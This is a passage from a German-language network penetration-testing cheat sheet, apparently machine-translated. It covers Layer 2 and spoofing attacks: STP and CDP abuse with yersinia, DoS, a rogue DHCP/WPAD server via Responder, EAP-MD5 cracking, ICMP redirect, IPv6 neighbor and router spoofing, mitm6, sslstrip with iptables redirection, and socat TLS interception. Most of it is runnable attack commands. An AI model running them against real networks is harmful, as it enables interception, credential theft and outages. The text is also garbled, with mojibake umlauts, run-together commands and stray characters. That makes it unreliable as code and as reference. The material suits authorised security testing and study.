yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Wenn der Angreifer mit 2 Switches verbunden ist, kann er der Root des neuen Baums sein und der gesamte Datenverkehr zwischen diesen Switches wird durch ihn geleitet** (ein MITM-Angriff wird durchgef√ºhrt).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP-Angriffe

Das CISCO Discovery Protocol (CDP) ist f√ºr die Kommunikation zwischen CISCO-Ger√§ten unerl√§sslich und erm√∂glicht es ihnen, sich gegenseitig zu **identifizieren und Konfigurationsdetails auszutauschen**.

#### Passive Datensammlung <a href="#0e0f" id="0e0f"></a>

CDP ist so konfiguriert, dass es Informationen √ºber alle Ports sendet, was zu einem Sicherheitsrisiko f√ºhren kann. Ein Angreifer, der sich mit einem Switch-Port verbindet, k√∂nnte Netzwerk-Sniffer wie **Wireshark**, **tcpdump** oder **Yersinia** einsetzen. Dadurch k√∂nnen sensible Daten √ºber das Netzwerkger√§t offengelegt werden, einschlie√ülich des Modells und der Version von Cisco IOS, auf dem es l√§uft. Der Angreifer k√∂nnte dann gezielt Schwachstellen in der identifizierten Cisco IOS-Version angreifen.

#### Induzierung einer CDP-Tabellen√ºberflutung <a href="#0d6a" id="0d6a"></a>

Ein aggressiverer Ansatz besteht darin, einen Denial-of-Service (DoS)-Angriff zu starten, indem der Speicher des Switches √ºberlastet wird und vorgegeben wird, ein legitimes CISCO-Ger√§t zu sein. Nachfolgend finden Sie die Befehlssequenz zur Initiierung eines solchen Angriffs mit Yersinia, einem Netzwerktool, das f√ºr Tests entwickelt wurde:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
W√§hrend dieses Angriffs wird die CPU des Switches und die CDP-Nachbartabelle stark belastet, was oft als **"Netzwerkparalyse"** aufgrund des √ºberm√§√üigen Ressourcenverbrauchs bezeichnet wird.

#### CDP-Imitat-Angriff
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Sie k√∂nnen auch [**scapy**](https://github.com/secdev/scapy/) verwenden. Stellen Sie sicher, dass Sie es mit dem `scapy/contrib`-Paket installieren.

### VoIP-Angriffe und das VoIP Hopper-Tool

VoIP-Telefone, die zunehmend mit IoT-Ger√§ten integriert sind, bieten Funktionen wie das Entsperren von T√ºren oder die Steuerung von Thermostaten √ºber spezielle Telefonnummern. Diese Integration kann jedoch Sicherheitsrisiken darstellen.

Das Tool [**voiphopper**](http://voiphopper.sourceforge.net) ist darauf ausgelegt, ein VoIP-Telefon in verschiedenen Umgebungen (Cisco, Avaya, Nortel, Alcatel-Lucent) zu emulieren. Es ermittelt die VLAN-ID des Sprachnetzwerks mithilfe von Protokollen wie CDP, DHCP, LLDP-MED und 802.1Q ARP.

**VoIP Hopper** bietet drei Modi f√ºr das Cisco Discovery Protocol (CDP):

1. **Sniff-Modus** (`-c 0`): Analysiert Netzwerkpakete, um die VLAN-ID zu identifizieren.
2. **Spoof-Modus** (`-c 1`): Generiert benutzerdefinierte Pakete, die einem echten VoIP-Ger√§t √§hneln.
3. **Spoof mit vordefiniertem Paketmodus** (`-c 2`): Sendet Pakete, die identisch mit denen eines bestimmten Cisco-IP-Telefonmodells sind.

Der bevorzugte Modus f√ºr Geschwindigkeit ist der dritte. Dabei m√ºssen folgende Angaben gemacht werden:

- Die Netzwerkschnittstelle des Angreifers (`-i`-Parameter).
- Der Name des zu emulierenden VoIP-Ger√§ts (`-E`-Parameter), der dem Cisco-Namensformat entspricht (z. B. SEP gefolgt von einer MAC-Adresse).

In Unternehmensumgebungen k√∂nnte man zum Nachahmen eines vorhandenen VoIP-Ger√§ts Folgendes tun:

- Das MAC-Label am Telefon √ºberpr√ºfen.
- Die Anzeigeeinstellungen des Telefons durchsuchen, um Modellinformationen anzuzeigen.
- Das VoIP-Ger√§t mit einem Laptop verbinden und CDP-Anfragen mit Wireshark beobachten.

Ein Beispielbefehl zum Ausf√ºhren des Tools im dritten Modus w√§re:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
DHCP-Angriffe

#### Aufz√§hlung
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Es k√∂nnen **zwei Arten von DoS-Angriffen** gegen DHCP-Server durchgef√ºhrt werden. Der erste besteht darin, **gen√ºgend gef√§lschte Hosts zu simulieren, um alle m√∂glichen IP-Adressen zu verwenden**.\
Dieser Angriff funktioniert nur, wenn Sie die Antworten des DHCP-Servers sehen k√∂nnen und das Protokoll abschlie√üen (**Discover** (Comp) --> **Offer** (Server) --> **Request** (Comp) --> **ACK** (Server)). Dies ist zum Beispiel **in WLAN-Netzwerken nicht m√∂glich**.

Eine andere M√∂glichkeit, einen DHCP-DoS-Angriff durchzuf√ºhren, besteht darin, ein **DHCP-RELEASE-Paket zu senden und als Quellcode jede m√∂gliche IP-Adresse zu verwenden**. Der Server wird dann denken, dass jeder die IP-Adresse nicht mehr verwendet.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Eine automatischere Methode hierf√ºr ist die Verwendung des Tools [DHCPing](https://github.com/kamorin/DHCPig).

Sie k√∂nnten die genannten DoS-Angriffe verwenden, um Clients dazu zu zwingen, neue Leases innerhalb der Umgebung zu erhalten und legitime Server so zu ersch√∂pfen, dass sie nicht mehr reagieren. Wenn die Legitimen dann versuchen, sich erneut zu verbinden, **k√∂nnen Sie b√∂sartige Werte bereitstellen, wie im n√§chsten Angriff erw√§hnt**.

#### Setzen b√∂sartiger Werte

Ein Rogue-DHCP-Server kann mithilfe des DHCP-Skripts unter `/usr/share/responder/DHCP.py` eingerichtet werden. Dies ist n√ºtzlich f√ºr Netzwerkangriffe, wie das Erfassen von HTTP-Verkehr und Anmeldeinformationen, indem der Verkehr auf einen b√∂sartigen Server umgeleitet wird. Das Einrichten eines Rogue-Gateways ist jedoch weniger effektiv, da dadurch nur ausgehender Verkehr vom Client erfasst wird und die Antworten vom echten Gateway fehlen. Stattdessen wird empfohlen, einen Rogue-DNS- oder WPAD-Server f√ºr einen effektiveren Angriff einzurichten.

Nachfolgend sind die Befehlsoptionen f√ºr die Konfiguration des Rogue-DHCP-Servers aufgef√ºhrt:

- **Unsere IP-Adresse (Gateway Advertisement)**: Verwenden Sie `-i 10.0.0.100`, um die IP-Adresse Ihres eigenen Ger√§ts als Gateway anzugeben.
- **Lokaler DNS-Dom√§nenname**: Optional k√∂nnen Sie `-d example.org` verwenden, um einen lokalen DNS-Dom√§nennamen festzulegen.
- **Urspr√ºngliche Router-/Gateway-IP**: Verwenden Sie `-r 10.0.0.1`, um die IP-Adresse des legitimen Routers oder Gateways anzugeben.
- **Prim√§re DNS-Server-IP**: Verwenden Sie `-p 10.0.0.100`, um die IP-Adresse des von Ihnen kontrollierten Rogue-DNS-Servers festzulegen.
- **Sekund√§re DNS-Server-IP**: Optional k√∂nnen Sie `-s 10.0.0.1` verwenden, um eine sekund√§re DNS-Server-IP festzulegen.
- **Netzmaske des lokalen Netzwerks**: Verwenden Sie `-n 255.255.255.0`, um die Netzmaske f√ºr das lokale Netzwerk festzulegen.
- **Schnittstelle f√ºr DHCP-Verkehr**: Verwenden Sie `-I eth1`, um DHCP-Verkehr auf einer bestimmten Netzwerkschnittstelle abzuh√∂ren.
- **WPAD-Konfigurationsadresse**: Verwenden Sie `-w "http://10.0.0.100/wpad.dat"`, um die Adresse f√ºr die WPAD-Konfiguration festzulegen, um den Webverkehr abzufangen.
- **Spoofing der Standard-Gateway-IP**: F√ºgen Sie `-S` hinzu, um die IP-Adresse des Standard-Gateways zu f√§lschen.
- **Auf alle DHCP-Anfragen antworten**: F√ºgen Sie `-R` hinzu, um den Server auf alle DHCP-Anfragen antworten zu lassen. Beachten Sie jedoch, dass dies laut und erkennbar ist.

Durch die korrekte Verwendung dieser Optionen kann ein Rogue-DHCP-Server eingerichtet werden, um den Netzwerkverkehr effektiv abzufangen.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP-Angriffe**

Hier sind einige Angriffstaktiken, die gegen 802.1X-Implementierungen verwendet werden k√∂nnen:

* Aktives Brute-Force-Passwortknacken √ºber EAP
* Angriff auf den RADIUS-Server mit fehlerhaftem EAP-Inhalt _(Exploits)_
* Erfassen von EAP-Nachrichten und Offline-Passwortknacken (EAP-MD5 und PEAP)
* Erzwingen der EAP-MD5-Authentifizierung zur Umgehung der TLS-Zertifikatsvalidierung
* Einschleusen von b√∂sartigem Netzwerkverkehr nach der Authentifizierung mit einem Hub oder √§hnlichem

Wenn der Angreifer zwischen dem Opfer und dem Authentifizierungsserver steht, k√∂nnte er versuchen, das Authentifizierungsprotokoll bei Bedarf auf EAP-MD5 herabzustufen und den Authentifizierungsversuch zu erfassen. Anschlie√üend k√∂nnte er dies durch Brute-Force versuchen, indem er:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Angriffe <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) ist eine Klasse von Netzwerkprotokollen, die entwickelt wurden, um ein **hochredundantes Routing-System** zu erstellen. Mit FHRP k√∂nnen physische Router zu einem einzigen logischen Ger√§t kombiniert werden, was die Ausfallsicherheit erh√∂ht und die Lastverteilung unterst√ºtzt.

**Cisco Systems-Ingenieure haben zwei FHRP-Protokolle entwickelt, GLBP und HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Es sind drei Versionen des Routing Information Protocol (RIP) bekannt: RIP, RIPv2 und RIPng. RIP und RIPv2 senden Datagramme √ºber den Port 520 mit UDP an Peers, w√§hrend RIPng Datagramme √ºber IPv6-Multicast an den UDP-Port 521 sendet. RIPv2 unterst√ºtzt die MD5-Authentifizierung. Bei RIPng ist keine native Authentifizierung implementiert, stattdessen wird auf optionale IPsec AH- und ESP-Header innerhalb von IPv6 vertraut.

- **RIP und RIPv2:** Die Kommunikation erfolgt √ºber UDP-Datagramme auf Port 520.
- **RIPng:** Verwendet UDP-Port 521, um Datagramme √ºber IPv6-Multicast zu senden.

Beachten Sie, dass RIPv2 die MD5-Authentifizierung unterst√ºtzt, w√§hrend RIPng keine native Authentifizierung enth√§lt und auf IPsec AH- und ESP-Header in IPv6 angewiesen ist.


### EIGRP Angriffe

**EIGRP (Enhanced Interior Gateway Routing Protocol)** ist ein dynamisches Routing-Protokoll. **Es handelt sich um ein Distanzvektor-Protokoll.** Wenn keine Authentifizierung und Konfiguration von passiven Schnittstellen vorhanden ist, kann ein **Eindringling** das EIGRP-Routing beeintr√§chtigen und **Routing-Tabellenvergiftung** verursachen. Dar√ºber hinaus ist das EIGRP-Netzwerk (das hei√üt, das autonome System) **flach und nicht in Zonen unterteilt**. Wenn ein **Angreifer eine Route einschleust**, ist es wahrscheinlich, dass sich diese Route im gesamten autonomen EIGRP-System **ausbreitet**.

Um ein EIGRP-System anzugreifen, ist es erforderlich, **eine Nachbarschaft mit einem legitimen EIGRP-Router herzustellen**, was viele M√∂glichkeiten er√∂ffnet, von grundlegender Aufkl√§rung bis hin zu verschiedenen Injektionen.

[**FRRouting**](https://frrouting.org/) erm√∂glicht es Ihnen, **einen virtuellen Router zu implementieren, der BGP, OSPF, EIGRP, RIP und andere Protokolle unterst√ºtzt**. Alles, was Sie tun m√ºssen, ist es auf Ihrem Angreifer-System bereitzustellen und Sie k√∂nnen tats√§chlich vorgeben, ein legitimer Router im Routing-Dom√§ne zu sein.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) verf√ºgt √ºber Funktionen zum Abfangen von EIGRP (Enhanced Interior Gateway Routing Protocol)-Broadcasts. Es erm√∂glicht auch das Einschleusen von Paketen, die zur √Ñnderung von Routing-Konfigurationen genutzt werden k√∂nnen.

### OSPF

Im Open Shortest Path First (OSPF)-Protokoll wird h√§ufig die MD5-Authentifizierung verwendet, um eine sichere Kommunikation zwischen Routern zu gew√§hrleisten. Diese Sicherheitsma√ünahme kann jedoch mit Tools wie Loki und John the Ripper kompromittiert werden. Diese Tools sind in der Lage, MD5-Hashes zu erfassen und zu knacken, wodurch der Authentifizierungsschl√ºssel offengelegt wird. Sobald dieser Schl√ºssel erhalten ist, kann er verwendet werden, um neue Routing-Informationen einzuf√ºhren. Zur Konfiguration der Routenparameter und zum Herstellen des kompromittierten Schl√ºssels werden die Registerkarten _Injection_ und _Connection_ verwendet.

- **Erfassen und Knacken von MD5-Hashes:** Hierf√ºr werden Tools wie Loki und John the Ripper verwendet.
- **Konfigurieren von Routenparametern:** Dies erfolgt √ºber die Registerkarte _Injection_.
- **Einstellen des kompromittierten Schl√ºssels:** Der Schl√ºssel wird unter der Registerkarte _Connection_ konfiguriert.

### Andere generische Tools & Quellen

* [**Above**](https://github.com/c4s73r/Above): Tool zum Scannen des Netzwerkverkehrs und zur Suche nach Schwachstellen
* Weitere Informationen zu Netzwerkangriffen finden Sie [hier](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Der Angreifer konfiguriert alle Netzwerkparameter (GW, IP, DNS) des neuen Netzwerkmitglieds, indem er gef√§lschte DHCP-Antworten sendet.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

√úberpr√ºfen Sie den [vorherigen Abschnitt](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect besteht darin, ein ICMP-Paket vom Typ 1 Code 5 zu senden, das anzeigt, dass der Angreifer der beste Weg ist, um eine IP zu erreichen. Wenn das Opfer dann die IP kontaktieren m√∂chte, sendet es das Paket √ºber den Angreifer.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS-Spoofing

Der Angreifer l√∂st einige (oder alle) Domains auf, nach denen das Opfer fragt.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Konfigurieren Sie Ihre eigene DNS mit dnsmasq**

Um Ihre eigene DNS-Konfiguration mit dnsmasq einzurichten, k√∂nnen Sie die folgenden Schritte befolgen:

1. Installieren Sie dnsmasq auf Ihrem System. Verwenden Sie dazu den Befehl `apt-get install dnsmasq` f√ºr Debian-basierte Systeme oder `yum install dnsmasq` f√ºr Red Hat-basierte Systeme.

2. √ñffnen Sie die Konfigurationsdatei von dnsmasq mit einem Texteditor. Die Datei befindet sich normalerweise unter `/etc/dnsmasq.conf`.

3. Konfigurieren Sie die gew√ºnschten DNS-Einstellungen in der Datei. Sie k√∂nnen beispielsweise benutzerdefinierte DNS-Eintr√§ge hinzuf√ºgen, indem Sie die Syntax `address=/domain/ip` verwenden. Ersetzen Sie "domain" durch die gew√ºnschte Domain und "ip" durch die entsprechende IP-Adresse.

4. Starten Sie den dnsmasq-Dienst neu, damit die √Ñnderungen wirksam werden. Verwenden Sie den Befehl `service dnsmasq restart` f√ºr Debian-basierte Systeme oder `systemctl restart dnsmasq` f√ºr Red Hat-basierte Systeme.

5. √úberpr√ºfen Sie die DNS-Konfiguration, indem Sie den Befehl `nslookup domain` ausf√ºhren. Ersetzen Sie "domain" durch die zuvor konfigurierte Domain. Sie sollten die entsprechende IP-Adresse erhalten.

Durch die Konfiguration Ihrer eigenen DNS mit dnsmasq k√∂nnen Sie die DNS-Aufl√∂sung f√ºr bestimmte Domains anpassen und steuern. Dies kann n√ºtzlich sein, um beispielsweise DNS-basierte Angriffe zu simulieren oder den Datenverkehr umzuleiten.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokale Gateways

Es gibt oft mehrere Routen zu Systemen und Netzwerken. Nachdem Sie eine Liste der MAC-Adressen im lokalen Netzwerk erstellt haben, verwenden Sie _gateway-finder.py_, um Hosts zu identifizieren, die IPv4-Weiterleitung unterst√ºtzen.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

F√ºr die lokale Hostaufl√∂sung, wenn DNS-Lookups fehlschlagen, verlassen sich Microsoft-Systeme auf **Link-Local Multicast Name Resolution (LLMNR)** und den **NetBIOS Name Service (NBT-NS)**. Ebenso nutzen **Apple Bonjour** und **Linux Zero-Configuration**-Implementierungen **Multicast DNS (mDNS)** zur Entdeckung von Systemen innerhalb eines Netzwerks. Aufgrund der nicht authentifizierten Natur dieser Protokolle und ihrer √úbertragung √ºber UDP durch das Senden von Broadcast-Nachrichten k√∂nnen sie von Angreifern ausgenutzt werden, um Benutzer auf b√∂sartige Dienste umzuleiten.

Sie k√∂nnen Dienste, die von Hosts gesucht werden, durch den Einsatz von Responder impersonieren, um gef√§lschte Antworten zu senden.\
Lesen Sie hier weitere Informationen dar√ºber, [wie man Dienste mit Responder impersoniert](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Browser verwenden h√§ufig das **Web Proxy Auto-Discovery (WPAD)-Protokoll, um automatisch Proxy-Einstellungen zu erwerben**. Dies beinhaltet das Abrufen von Konfigurationsdetails von einem Server, speziell √ºber eine URL wie "http://wpad.example.org/wpad.dat". Die Entdeckung dieses Servers durch die Clients kann auf verschiedene Weise erfolgen:

- √úber **DHCP**, wobei die Entdeckung durch Verwendung eines speziellen Code-252-Eintrags erleichtert wird.
- Durch **DNS**, bei dem nach einem Hostnamen mit der Bezeichnung _wpad_ in der lokalen Dom√§ne gesucht wird.
- √úber **Microsoft LLMNR und NBT-NS**, die als Fallback-Mechanismen verwendet werden, wenn DNS-Lookups nicht erfolgreich sind.

Das Tool Responder nutzt dieses Protokoll aus, indem es als **b√∂sartiger WPAD-Server** agiert. Es verwendet DHCP, DNS, LLMNR und NBT-NS, um Clients in die Irre zu f√ºhren und eine Verbindung zu ihm herzustellen. Um tiefer in die Thematik einzusteigen, wie Dienste mit Responder impersoniert werden k√∂nnen, [schauen Sie hier](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Sie k√∂nnen verschiedene Dienste im Netzwerk anbieten, um einen Benutzer zu **t√§uschen**, um einige **Klartext-Anmeldeinformationen** einzugeben. **Weitere Informationen zu diesem Angriff finden Sie in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Dieser Angriff √§hnelt sehr dem ARP Spoofing, jedoch im IPv6-Netzwerk. Sie k√∂nnen das Opfer glauben lassen, dass die IPv6 des Gateways die MAC-Adresse des Angreifers hat.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Einige Betriebssysteme konfigurieren standardm√§√üig das Gateway anhand der RA-Pakete, die im Netzwerk gesendet werden. Um den Angreifer als IPv6-Router zu deklarieren, k√∂nnen Sie Folgendes verwenden:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP Spoofing

Standardm√§√üig versuchen einige Betriebssysteme, die DNS-Konfiguration durch das Lesen eines DHCPv6-Pakets im Netzwerk vorzunehmen. Ein Angreifer k√∂nnte dann ein DHCPv6-Paket senden, um sich selbst als DNS-Server zu konfigurieren. Der DHCP stellt auch eine IPv6-Adresse f√ºr das Opfer bereit.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (gef√§lschte Seite und JS-Code-Injektion)

## Internetangriffe

### sslStrip

Im Grunde genommen macht dieser Angriff folgendes: Wenn der **Benutzer** versucht, auf eine **HTTP**-Seite zuzugreifen, die zur **HTTPS**-Version umleitet, wird **sslStrip** eine **HTTP-Verbindung zum** Client und eine **HTTPS-Verbindung zum** Server aufrechterhalten, um die Verbindung im **Klartext** abzufangen.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mehr Informationen [hier](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ und dns2proxy zum Umgehen von HSTS

Der **Unterschied** zwischen **sslStrip+ und dns2proxy** gegen√ºber **sslStrip** besteht darin, dass sie beispielsweise _**www.facebook.com**_ **auf** _**wwww.facebook.com**_ (beachte das **zus√§tzliche** "**w**") umleiten und die **Adresse dieser Domain als die IP des Angreifers** festlegen. Auf diese Weise wird der **Client** eine Verbindung zu _**wwww.facebook.com**_ (dem Angreifer) herstellen, aber im Hintergrund wird **sslstrip+** die **echte Verbindung** √ºber HTTPS mit **www.facebook.com** aufrechterhalten.

Das **Ziel** dieser Technik ist es, **HSTS zu umgehen**, da _**wwww**.facebook.com_ nicht im **Cache** des Browsers gespeichert wird. Dadurch wird der Browser dazu verleitet, die **Facebook-Authentifizierung in HTTP** durchzuf√ºhren.\
Beachten Sie, dass der Angriff nur funktioniert, wenn das Opfer zun√§chst versucht, auf [http://www.faceook.com](http://www.faceook.com) und nicht auf HTTPS zuzugreifen. Dies kann durch √Ñndern der Links innerhalb einer HTTP-Seite erreicht werden.

Mehr Informationen [hier](https://www.bettercap.org/legacy/#hsts-bypass), [hier](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) und [hier](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip oder sslStrip+ funktionieren nicht mehr. Dies liegt daran, dass in den Browsern HSTS-Regeln vorgespeichert sind. Selbst wenn ein Benutzer zum ersten Mal auf eine "wichtige" Domain zugreift, erfolgt der Zugriff √ºber HTTPS. Beachten Sie auch, dass die vorgespeicherten Regeln und andere generierte Regeln die Flagge** [**`includeSubdomains`**](https://hstspreload.appspot.com) **verwenden k√∂nnen. Das Beispiel mit** _**wwww.facebook.com**_ **von vorhin funktioniert nicht mehr, da** _**facebook.com**_ **HSTS mit `includeSubdomains` verwendet.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP-Listening auf Port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL auf Port lauschen

#### Generieren von Schl√ºsseln und selbstsigniertem Zertifikat

```bash
openssl genrsa -out private.key 2048
openssl req -new -x509 -key private.key -out certificate.crt -days 365
```

#### Start listening on port 443 with the generated keys and certificate

```bash
openssl s_server -key private.key -cert certificate.crt -accept 443 -www
```

#### Access the server using a web browser

Open a web browser and navigate to `https://<your-ip-address>`. You should be able to access the server and see the response.
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Zuh√∂ren mit Zertifikat

Eine M√∂glichkeit, den Netzwerkverkehr abzuh√∂ren, besteht darin, ein g√ºltiges Zertifikat zu verwenden. Dies erm√∂glicht es Ihnen, den Datenverkehr zwischen einem Client und einem Server zu entschl√ºsseln und mitzulesen.

Um diese Methode anzuwenden, m√ºssen Sie zun√§chst ein g√ºltiges Zertifikat erstellen. Dies kann entweder ein selbstsigniertes Zertifikat oder ein von einer Zertifizierungsstelle (CA) ausgestelltes Zertifikat sein.

Sobald Sie das Zertifikat haben, m√ºssen Sie es auf dem Ger√§t installieren, auf dem Sie den Netzwerkverkehr abh√∂ren m√∂chten. Dies kann auf verschiedenen Arten erfolgen, je nachdem, welches Betriebssystem und welche Tools Sie verwenden.

Nachdem das Zertifikat installiert ist, m√ºssen Sie den Netzwerkverkehr umleiten, damit er √ºber Ihren Abh√∂rpunkt l√§uft. Dies kann durch √Ñndern der Netzwerkkonfiguration oder durch Verwendung von Tools wie ARP-Spoofing oder DNS-Spoofing erreicht werden.

Sobald der Datenverkehr √ºber Ihren Abh√∂rpunkt l√§uft, k√∂nnen Sie ihn mit dem privaten Schl√ºssel des Zertifikats entschl√ºsseln und mitlesen. Dies erm√∂glicht es Ihnen, sensible Informationen wie Benutzernamen, Passw√∂rter oder andere vertrauliche Daten zu erfassen.

Es ist wichtig zu beachten, dass das Abh√∂ren des Netzwerkverkehrs mit einem Zertifikat in den meisten F√§llen illegal ist, es sei denn, Sie haben die ausdr√ºckliche Erlaubnis des Eigent√ºmers des Netzwerks. Diese Methode sollte nur zu legitimen Zwecken und mit Zustimmung verwendet werden.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Zuh√∂ren mit Zertifikat und Umleitung zu den Hosts

Um den Datenverkehr abzuh√∂ren und zu den Hosts umzuleiten, k√∂nnen Zertifikate verwendet werden. Dies erm√∂glicht es uns, den Datenverkehr zu entschl√ºsseln und zu analysieren, bevor er an den Zielhost weitergeleitet wird.

Um dies zu erreichen, m√ºssen wir ein g√ºltiges Zertifikat f√ºr den Zielhost erstellen und den Datenverkehr √ºber einen Proxy-Server umleiten. Der Proxy-Server fungiert als Vermittler zwischen dem Client und dem Zielhost und erm√∂glicht es uns, den Datenverkehr abzufangen und zu analysieren.

Hier sind die Schritte, um den Datenverkehr abzuh√∂ren und zu den Hosts umzuleiten:

1. Erstellen Sie ein g√ºltiges Zertifikat f√ºr den Zielhost. Dies kann entweder ein selbstsigniertes Zertifikat oder ein von einer Zertifizierungsstelle ausgestelltes Zertifikat sein.

2. Konfigurieren Sie den Proxy-Server, um den Datenverkehr abzufangen und zu analysieren. Stellen Sie sicher, dass der Proxy-Server das erstellte Zertifikat verwendet.

3. Leiten Sie den Datenverkehr von den Clients zum Proxy-Server um. Dies kann durch √Ñndern der Proxy-Einstellungen auf den Clients oder durch Umleitung des Datenverkehrs auf Netzwerkebene erreicht werden.

4. Der Proxy-Server empf√§ngt den Datenverkehr, entschl√ºsselt ihn mithilfe des Zertifikats und leitet ihn dann an den Zielhost weiter.

Durch das Abh√∂ren und Umleiten des Datenverkehrs k√∂nnen wir den Inhalt analysieren, sensible Informationen extrahieren und Schwachstellen im Netzwerk identifizieren. Es ist jedoch wichtig zu beachten, dass diese Technik nur in legalen und autorisierten Umgebungen angewendet werden sollte.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Manchmal, wenn der Client √ºberpr√ºft, ob die CA g√ºltig ist, k√∂nnten Sie **ein Zertifikat eines anderen Hostnamens vorlegen, das von einer CA signiert wurde**.\
Ein weiterer interessanter Test besteht darin, ein **selbstsigniertes Zertifikat des angeforderten Hostnamens** bereitzustellen.

